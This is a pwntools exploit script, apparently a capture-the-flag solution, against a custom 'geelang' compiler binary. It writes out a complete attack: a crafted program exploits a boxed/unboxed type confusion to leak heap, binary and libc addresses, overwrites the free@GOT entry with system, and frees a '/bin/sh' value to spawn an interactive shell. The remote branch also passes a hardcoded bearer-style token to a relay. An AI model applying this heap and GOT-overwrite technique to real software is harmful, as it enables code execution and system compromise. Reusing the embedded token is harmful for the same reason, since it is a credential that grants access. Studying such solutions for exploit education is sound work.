from pwn import *

PROGNAME   = "./geelang-compiler"

if args.REMOTE:
    p = process(["./cli-relay", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFiQGdlZWdsZS5vcmciLCJzZXJ2aWNlIjoidWJlcnByb3h5QHNlcnZpY2VzLmdlZWdsZS5vcmciLCJleHAiOjE1NzQ1ODE3NjR9.Q4IVZ28t9s73-E7Lwr42GsbpXi4bqJF9MpVTkKJrllU", "geelang.corp.geegle.org"])
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
pause()
GETSHELL = '''
INT a 99
DEL a
BOX b 1 # Create boxed/unboxed overlap
PRINT a # Leak Heap chunk

INT z 24
SUB a z
PRINT b # Leak Binary (print_int) Address


SET z {}
MOV a b
SUB a z # Offset to binary base
PRINT a

SET z {}
ADD a z # Offset to free GOT entry

PRINT a
PRINT b # Leak free@GOT

INT SYSTEM 0
SET z {}
MOV SYSTEM b
SUB SYSTEM z # Offset to libc base

SET z {}
ADD SYSTEM z # Offset to system
PRINT SYSTEM

MOV b SYSTEM

SET a {} # /bin/sh
DEL a

END
'''.format(elf.symbols["print_int"],
        elf.got["free"],
        libc.symbols["free"],
        libc.symbols["system"],
        u64("/bin/sh\x00")
        )
print GETSHELL
pause()
p.sendline(GETSHELL)

p.interactive()

